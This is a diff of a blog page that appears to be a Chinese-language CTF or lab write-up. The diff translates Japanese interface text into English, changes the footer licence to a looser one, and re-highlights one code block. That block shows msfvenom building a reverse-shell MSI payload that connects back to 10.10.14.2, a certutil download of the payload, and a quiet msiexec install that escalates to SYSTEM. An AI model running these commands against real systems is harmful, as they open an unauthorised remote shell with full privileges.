@@ -155,7 +155,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -347,7 +347,7 @@
 
 <p>就是做一个msi文件，安装的时候自动提升权限</p>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>msf生成msi，安装时候自动提升权限得到system shell：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">10.10</span>.<span class="number">14.2</span> LPORT=<span class="number">4444</span> -f msi -o reverse.msi</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://<span class="number">10.10</span>.<span class="number">14.2</span>:<span class="number">7777</span>/reverse.msi reverse.msi</span><br><span class="line"></span><br><span class="line">msiexec /quiet /qn /i reverse.msi</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/x64/shell_reverse_tcp LHOST=<span class="number">10.10</span>.<span class="number">14.2</span> LPORT=<span class="number">4444</span> <span class="operator">-f</span> msi <span class="literal">-o</span> reverse.msi</span><br><span class="line"></span><br><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> http://<span class="number">10.10</span>.<span class="number">14.2</span>:<span class="number">7777</span>/reverse.msi reverse.msi</span><br><span class="line"></span><br><span class="line">msiexec /quiet /qn /i reverse.msi</span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -388,7 +388,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2021-08-09T01:09:36.675Z" itemprop="dateUpdated">2021-08-09 09:09:36</time>
+    Last updated: <time datetime="2021-08-09T01:09:36.675Z" itemprop="dateUpdated">2021-08-09 09:09:36</time>
 </span><br>
 
 
@@ -555,7 +555,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
